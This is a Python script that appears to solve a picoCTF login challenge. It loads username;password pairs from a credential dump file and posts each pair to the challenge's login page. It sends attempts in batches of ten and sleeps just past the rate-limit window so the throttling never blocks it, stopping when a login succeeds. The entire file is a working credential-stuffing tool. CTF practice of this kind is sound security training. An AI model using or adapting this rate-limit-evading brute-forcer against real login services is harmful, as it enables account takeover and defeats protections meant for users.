import requests
import time
import os

# ── Config ────────────────────────────────────────────────────────────────────
TARGET      = "http://candy-mountain.picoctf.net:58250/login"
CREDS_FILE  = "creds-dump.txt"   # same directory as this script
BATCH_SIZE  = 10                 # stay under MAX_REQUESTS (10 attempts per epoch)
SLEEP_TIME  = 31                 # just over EPOCH_DURATION (30s) to guarantee reset
# ──────────────────────────────────────────────────────────────────────────────


def load_creds(filepath):
    creds = []
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if not line or ";" not in line:
                continue
            username, password = line.split(";", 1)
            creds.append((username.strip(), password.strip()))
    print(f"[*] Loaded {len(creds)} credential pairs from '{filepath}'")
    return creds


def try_login(session, username, password):
    try:
        r = session.post(
            TARGET,
            data={"username": username, "password": password},
            timeout=10,
            allow_redirects=True
        )

        if "Rate" in r.text or r.status_code == 429:
            return "rate_limited"
        
        # successful login redirects to index; check for flag or absence of login form
        if "Invalid" not in r.text and "login" not in r.url.lower():
            return "success"

        return "fail"

    except requests.RequestException as e:
        print(f"  [!] Request error: {e}")
        return "error"


def brute_force(creds):
    s = requests.Session()
    total    = len(creds)
    found    = None

    for i, (username, password) in enumerate(creds):
        # ── Sleep between batches (before starting a new one, not after the last) ──
        if i > 0 and i % BATCH_SIZE == 0:
            print(f"\n[*] Batch complete ({i}/{total}). Sleeping {SLEEP_TIME}s to reset epoch...\n")
            time.sleep(SLEEP_TIME)

        print(f"[{i+1}/{total}] Trying  {username}:{password} ... ", end="", flush=True)
        result = try_login(s, username, password)

        if result == "success":
            print("✓  SUCCESS!")
            found = (username, password)
            break
        elif result == "rate_limited":
            print("RATE LIMITED — sleeping early and retrying this pair")
            time.sleep(SLEEP_TIME)
            # retry the same pair once after sleeping
            result2 = try_login(s, username, password)
            if result2 == "success":
                found = (username, password)
                break
            print(f"  [~] Retry result: {result2}")
        elif result == "error":
            print("ERROR (network)")
        else:
            print("fail")

    return found


if __name__ == "__main__":
    script_dir = os.path.dirname(os.path.abspath(__file__))
    creds_path = os.path.join(script_dir, CREDS_FILE)

    creds = load_creds(creds_path)
    if not creds:
        print("[!] No credentials loaded. Check your creds-dump.txt format (username;password).")
        exit(1)

    print(f"[*] Target : {TARGET}")
    print(f"[*] Batches: {BATCH_SIZE} attempts / {SLEEP_TIME}s sleep\n")

    result = brute_force(creds)

    if result:
        print(f"\n[+] Valid credentials found!")
        print(f"    Username : {result[0]}")
        print(f"    Password : {result[1]}")
    else:
        print("\n[-] Exhausted all credentials. No valid login found.")